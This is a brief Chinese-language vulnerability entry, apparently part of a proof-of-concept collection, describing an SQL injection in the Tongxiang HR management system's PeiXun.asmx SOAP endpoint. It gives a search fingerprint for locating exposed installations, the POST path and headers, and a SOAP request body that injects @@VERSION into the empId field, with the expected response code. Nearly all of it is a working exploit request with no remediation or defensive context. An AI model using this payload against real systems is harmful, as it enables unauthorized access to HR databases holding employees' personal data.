# 同享人力资源管理系统-TXEHRV15PeiXun.asmxSQL注入漏洞

- **系统**：同享人力资源管理系统-TXEHRV15PeiXun.asmx　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="/Assistant/Default.aspx"`
- **请求**：`POST /MobileService/PeiXun.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`Content-Length: length`　`SOAPAction: "http://tempuri.org/GetPeiXunRecord"`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetPeiXunRecord xmlns="http://tempuri.org/">
<company></company>
<empId>@@VERSION</empId>
<pageIndex>1</pageIndex>
<size>10</size>
</GetPeiXunRecord>
</soap:Body>
</soap:Envelope>
```
- **预期**：200　|　—